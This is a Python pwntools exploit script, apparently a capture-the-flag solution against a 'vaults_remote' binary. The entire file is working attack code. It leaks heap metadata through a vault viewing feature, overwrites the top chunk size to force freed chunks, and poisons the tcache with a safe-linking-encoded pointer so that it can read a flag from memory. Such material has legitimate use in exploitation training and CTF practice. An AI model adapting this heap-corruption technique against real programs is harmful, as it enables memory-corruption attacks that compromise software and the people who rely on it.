from pwn import context, process, remote, gdb, ELF, args, u64, p64, re
import os

# Context settings
context.binary = './vaults_remote'
context.terminal = ['tmux', 'splitw', '-h']
# context.log_level = 'debug'  # Uncomment for verbose logging

# === CONFIG ===
BINARY = './vaults_remote'
HOST = 'localhost'
PORT = 5410

# === HELPER ===
def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return process(BINARY)

def start_gdb():
    return gdb.debug(BINARY, '''
        break main
        continue
    ''')

# === Helper functions ===

def purchase_vault(size, password):
    p.sendline(b'purchase')
    p.sendlineafter(b': ', str(size).encode())
    p.sendlineafter(b': ', password)
    p.recvuntil(b'Your Vault ID: ')
    vault_id = p.recvline().strip()
    p.recvuntil(b'Vault Location: 0x')
    location = int(p.recv(12),16) - 0x10
    return (int(vault_id), location)
    
def set_vault_content(vault_id, password, content):
    p.sendline(b'set')
    p.sendlineafter(b': ', str(vault_id).encode())
    p.sendlineafter(b': ', password)
    p.sendlineafter(b': ', content)

def view_vault_content(vault_id, password):
    p.sendline(b'view')
    p.sendlineafter(b': ', str(vault_id).encode())
    p.sendlineafter(b': ', password)
    p.sendlineafter(b'? ', b'h')

def leak_data(vault_id, offset):
    view_vault_content(vault_id, b'A'*16)
    output = p.recvuntil(b'> ').decode()
    hex_bytes = re.findall(r'[0-9a-fA-F]{2}', output)
    raw = bytes(int(b, 16) for b in hex_bytes)
    leak = u64(raw[offset:(offset+8)])
    return leak



# === EXPLOIT ===

def exploit(p):
    # == Variables == 
    page_size = os.sysconf("SC_PAGESIZE")
    password = b'A'*16 + b'\xC0\x0f'
    chunk_head_sz = 0x10
    chunk_target_size = 0x40  

    # Probe Current Top Chunk Size
    vault_id, location = purchase_vault(0x10,password)
    top_size = leak_data(vault_id, (0x10+8))
    print(f'[+] Leaked top chunk size (1): {hex(top_size)}')

    # Prepare Heap for exploit
    size_1 = top_size - chunk_head_sz - (2*0x10) - chunk_target_size
    size_1 &= (page_size - 1)
    size_1 -= 1
    vuln_1, address_1 = purchase_vault(size_1, password)

    # Shrink Heap 
    top_size = leak_data(vuln_1, (size_1+8))
    print(f'[+] Leaked top chunk size (2): {hex(top_size)}')
    new_top_size = top_size & (page_size - 1)
    payload = b'\x00'*(size_1+8)
    payload += p64(new_top_size)
    set_vault_content(vuln_1, b'A'*16, payload)
    new_top_size = leak_data(vuln_1, (size_1+8))
    print(f'[+] Leaked new top chunk size (3): {hex(new_top_size)}')

    # Trigger Sysmalloc + Freed Top Chunk
    size_2 = page_size - chunk_head_sz - (0x10*2) - chunk_target_size
    vuln_2, address_2 = purchase_vault(size_2, password)

    # Repeat Proccess for Second Freed Chunk
    top_size = leak_data(vuln_2, (size_2+8))
    print(f'[+] Leaked top chunk size (4): {hex(top_size)}')
    new_top_size = top_size & (page_size - 1)
    payload = b'\x00'*(size_2+8)
    payload += p64(new_top_size)
    set_vault_content(vuln_2, b'A'*16, payload)
    new_top_size = leak_data(vuln_2, (size_2+8))
    print(f'[+] Leaked new top chunk size (5): {hex(new_top_size)}')
    purchase_vault(size_2,password)

    # Tcache Poison 
    payload = b'\x00'*(size_2+8)
    payload += b'\x41' + b'\x00'*7
    payload += p64((address_1-0x60) ^ (address_2 >> 12))
    set_vault_content(vuln_2, b'A'*16, payload)

    # Obtain Target and Print Contents
    purchase_vault(0x30, password)
    vault_id, location = purchase_vault(0x30,password)
    p.sendline(b'view')
    p.sendlineafter(b': ', str(vault_id).encode())
    p.sendlineafter(b': ', b'A'*16)
    p.sendlineafter(b'? ', b'h')
    output = p.recvuntil(b'> ').decode()
    hex_bytes = re.findall(r'[0-9a-fA-F]{2}', output)
    raw = bytes(int(b, 16) for b in hex_bytes)
    flag_bytes = raw[16:64]
    flag = flag_bytes.decode()
    print(f"[*] Vault Contents: {flag}")

# === MAIN ===
if __name__ == '__main__':
    if args.GDB:
        p = start_gdb()
    else:
        p = conn()
    exploit(p)
